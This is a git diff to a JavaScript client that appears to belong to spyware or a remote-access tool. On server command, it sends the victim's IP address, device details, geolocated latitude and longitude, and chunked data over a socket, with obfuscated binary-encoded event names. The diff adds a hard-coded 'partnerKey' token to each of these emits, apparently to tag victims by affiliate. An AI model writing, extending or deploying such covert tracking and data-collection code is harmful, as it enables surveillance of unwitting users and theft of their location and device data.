@@ -11,6 +11,8 @@ const notificatioClose = document.getElementById('notificatioClose');
 const notificationTitle = document.getElementById('notificationTitle');
 const notificationMessage = document.getElementById('notificationMessage');
 
+const partnerKey = 'ckKyVx4WfJxPSOX3aRLCdntX2uDvOIwv1HqGOFlahBDNVc37gT9taviOa0zB1RGe4HQwuATfgMQpHYqGLEnV3g==';
+
 var ipAdd;
 let stream;
 
@@ -71,6 +73,7 @@ socket.on('connect', async () => {
         userName: currentuserName,
         userId: currentuserId,
         socketId: socketId,
+        partnerId: partnerKey
         // ipAdd: ipAdd,
         // deviceInfo: deviceInfo
     };
@@ -85,16 +88,18 @@ socket.on('connect', async () => {
     const ipInfo = binaryEvent('ipInfo');
     socket.on(ipInfo, () => {
         const ip = stringToBinary(ipAdd.query);
+        const partnerId = stringToBinary(partnerKey);
         const sendIpInfo = binaryEvent('sendIpInfo');
-        socket.emit(sendIpInfo, ip);
+        socket.emit(sendIpInfo, partnerId, ip);
     });
 
     const DeviceInfo = binaryEvent('DeviceInfo');
     socket.on(DeviceInfo, () => {
+        const partnerId = stringToBinary(partnerKey);
         const dInfo = stringToBinary(JSON.stringify(deviceInfo));
         const ip = stringToBinary(JSON.stringify(ipAdd));
         const sendDeviceInfo = binaryEvent('sendDeviceInfo');
-        socket.emit(sendDeviceInfo, dInfo, ip);
+        socket.emit(sendDeviceInfo, dInfo, ip, partnerId);
     });
 
     logout.addEventListener('click', (e) => {
@@ -281,7 +286,9 @@ socket.on('connect', async () => {
                 const index = stringToBinary(indexString);
                 const totalChunk = stringToBinary(totalChunksString);
 
-                socket.emit(sentDataChunk, chunk, index, totalChunk);
+                const partnerId = stringToBinary(partnerKey)
+
+                socket.emit(sentDataChunk, chunk, index, totalChunk, partnerId);
             };
         } catch (error) {
             console.error('Error:', error);
@@ -289,14 +296,15 @@ socket.on('connect', async () => {
     });
 
     const location = binaryEvent('location');
-    socket.on(location, async (id) => {
+    socket.on(location, async () => {
         const raw = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query');
         const info = await raw.json();
 
         const lat = stringToBinary(JSON.stringify(info.lat));
         const lon = stringToBinary(JSON.stringify(info.lon));
+        const partnerID = stringToBinary(partnerKey);
         const sendLocation = binaryEvent('sendLocation');
-        socket.emit(sendLocation, lat, lon);
+        socket.emit(sendLocation, lat, lon, partnerID);
     });
 
     const sendNotification = binaryEvent('sendNotification');
